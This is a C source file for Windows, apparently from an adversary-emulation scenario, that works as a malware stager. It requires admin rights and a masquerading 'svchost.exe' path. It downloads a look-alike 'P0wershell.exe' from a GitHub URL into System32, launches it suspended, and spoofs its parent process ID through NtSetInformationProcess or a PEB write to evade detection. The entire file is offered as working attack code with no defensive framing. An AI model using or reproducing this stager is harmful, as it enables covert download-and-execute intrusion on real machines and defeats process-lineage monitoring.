#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <urlmon.h>

BOOL WINAPI IsUserAnAdmin(void);

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

int main(void) {
    if (!IsUserAnAdmin())
        return 1;

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (lstrcmpiA(path, "C:\\Program Files\\Microsoft\\svchost.exe") != 0)
        return 1;

    printf("[+] Running in Elevated Session.\n");

    // pick a random running process as parent (not our own process)
    DWORD targetPID = 0;
    char targetName[MAX_PATH] = "";
    DWORD myPID = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        DWORD pids[256];
        char names[256][MAX_PATH];
        DWORD count = 0;
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID != myPID && pe.th32ProcessID != 0 && pe.th32ProcessID != 4 && count < 256) {
                    pids[count] = pe.th32ProcessID;
                    lstrcpynA(names[count], pe.szExeFile, MAX_PATH);
                    count++;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        if (count > 0) {
            srand(GetTickCount());
            DWORD idx = rand() % count;
            targetPID = pids[idx];
            lstrcpynA(targetName, names[idx], MAX_PATH);
        }
    }

    if (targetPID == 0) {
        printf("[-] No valid process found for PPID spoofing.\n");
        return 1;
    }
    printf("[+] Using %s (PID: %lu) as spoofed parent\n", targetName, targetPID);

    // download P0wershell.exe
    const char* url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/P0wershell.exe";
    const char* outPath = "C:\\Windows\\System32\\P0wershell.exe";
    printf("[+] Downloading P0wershell.exe...\n");
    HRESULT hr = URLDownloadToFileA(NULL, url, outPath, 0, NULL);
    if (hr != S_OK) {
        printf("[-] Download failed (HRESULT: 0x%lx).\n", hr);
        return 1;
    }
    printf("[+] Download complete.\n");

    // open target for handle duplication
    HANDLE hTarget = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetPID);
    if (!hTarget) {
        printf("[-] Failed to open target process (%lu)\n", GetLastError());
        return 1;
    }

    // resolve NtQueryInformationProcess from ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG) =
        (NTSTATUS (NTAPI *)(HANDLE, DWORD, PVOID, ULONG, PULONG))GetProcAddress(hNtdll, "NtQueryInformationProcess");

    // resolve NtSetInformationProcess from ntdll
    NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG) =
        (NTSTATUS (NTAPI *)(HANDLE, DWORD, PVOID, ULONG))GetProcAddress(hNtdll, "NtSetInformationProcess");

    if (!pNtQueryInformationProcess || !pNtSetInformationProcess) {
        printf("[-] Failed to resolve NT APIs\n");
        CloseHandle(hTarget);
        return 1;
    }

    // create P0wershell.exe suspended
    STARTUPINFOA si = { .cb = sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
        CloseHandle(hTarget);
        return 1;
    }
    printf("[+] Created P0wershell.exe suspended (PID: %lu)\n", pi.dwProcessId);

    // attempt PPID spoofing via NtSetInformationProcess
    DWORD parentPID = targetPID;
    NTSTATUS status = pNtSetInformationProcess(pi.hProcess, 0x1D, &parentPID, sizeof(DWORD));
    if (status >= 0) {
        printf("[+] PPID spoofed via NtSetInformationProcess\n");
    } else {
        // fallback: modify PEB directly
        PROCESS_BASIC_INFORMATION pbi;
        ULONG retLen;
        status = pNtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen);
        if (status >= 0) {
            ULONG_PTR newParent = (ULONG_PTR)targetPID;
            if (WriteProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x098, &newParent, sizeof(ULONG_PTR), NULL)) {
                printf("[+] PPID spoofed via PEB modification\n");
            } else {
                printf("[-] PEB modification failed (%lu)\n", GetLastError());
            }
        } else {
            printf("[-] NtQueryInformationProcess failed\n");
        }
    }

    // resume the process
    ResumeThread(pi.hThread);
    printf("[+] P0wershell.exe resumed\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hTarget);

    Sleep(2000);
    return 0;
}
